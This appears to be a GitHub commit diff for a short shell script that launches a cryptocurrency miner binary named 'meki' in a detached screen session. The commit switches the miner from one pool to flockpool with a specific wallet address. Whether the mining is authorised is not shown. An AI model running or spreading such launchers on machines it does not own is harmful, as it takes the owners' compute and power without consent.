ccbf18661b3e587d361aef6ab18642ee0cc50ec8
renilo <88342640+renilo@users.noreply.github.com>
2021-11-15 18:15:30 +0700

    Update baru-hajar.sh

--- baru-hajar.sh
+++ baru-hajar.sh
@@ -1,2 +1,1 @@
-screen -dmS Running ./meki -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u WALLET.WORKER_NAME
-
+screen -dmS Running ./meki -a gr -o eu.flockpool.com:4444 -u RGA4LQvjY9E7G5WSG6ZZuTmDB5sKr3Hmj5.TEST1
